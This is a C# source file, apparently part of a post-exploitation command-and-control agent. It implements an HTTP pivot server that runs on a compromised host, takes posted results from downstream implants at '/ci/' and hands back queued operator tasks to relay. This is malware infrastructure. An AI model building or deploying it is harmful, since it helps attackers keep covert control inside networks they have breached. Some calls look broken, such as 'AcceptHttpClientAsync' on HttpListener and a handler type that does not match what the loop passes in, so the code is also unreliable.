using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Helpers;
using Agent.Models;

namespace Agent.Service.Pivoting
{
    public class PivotHttpServer : PivotServer
    {
        public PivotHttpServer(ConnexionUrl conn, string serverKey) : base(conn, serverKey)
        {
        }


        public override async Task Start()
        {
            try
            {
                this.Status = RunningService.RunningStatus.Running;
                var listener = new HttpListener();

                string url = "http://" + Connexion.Address + ":" +Connexion.Port + "/";
                
                listener.Prefixes.Add(url);
                listener.Start();

                while (!_tokenSource.IsCancellationRequested)
                {
                    // this blocks until a connection is received or token is cancelled
                    var client = await listener.AcceptHttpClientAsync(_tokenSource);

                    // do something with the connected client
                    var thread = new Thread(async () => await HandleClient(client));
                    thread.Start();
                }
                // handle client in new thread

                listener.Stop();
            }
            finally
            {
                this.Status = RunningService.RunningStatus.Stoped;
            }
        }

        private async Task HandleClient(HttpListenerContext client)
        {
            if (client == null)
                return;

            try
            {
                HttpListenerRequest request = client.Request;
                HttpListenerResponse response = client.Response;

                if (!client.Request.Url.LocalPath.ToLower().StartsWith("/ci/") || client.Request.HttpMethod != "POST")
                {
                    await response.ReturnNotFound();
                    return;
                }

                string content = string.Empty;
                using (StreamReader reader = new StreamReader(request.InputStream, request.ContentEncoding))
                {
                    content = await reader.ReadToEndAsync();
                    Debug.WriteLine("HTTP Pivot : POST Request Content: " + content);
                }

                var responses = Encoding.UTF8.GetBytes(content).Deserialize<List<MessageResult>>();
                _messageService.EnqueueResults(responses);

                var relays = this.ExtractRelays(responses);

                var tasks = this._messageService.GetMessageTasksToRelay(relays);

                response.StatusCode = 200;
                response.ContentType = "text/plain";
                byte[] buffer = tasks.Serialize();
                response.ContentLength64 = buffer.Length;
                System.IO.Stream output = response.OutputStream;
                await output.WriteAsync(buffer, 0, buffer.Length);
                output.Close();

            }
            catch (Exception ex)
            {
#if DEBUG
                Debug.WriteLine(ex);
#endif
            }
            finally
            {
                Debug.WriteLine($"HTTP Pivot  : disconnected");
            }
        }
    }
}
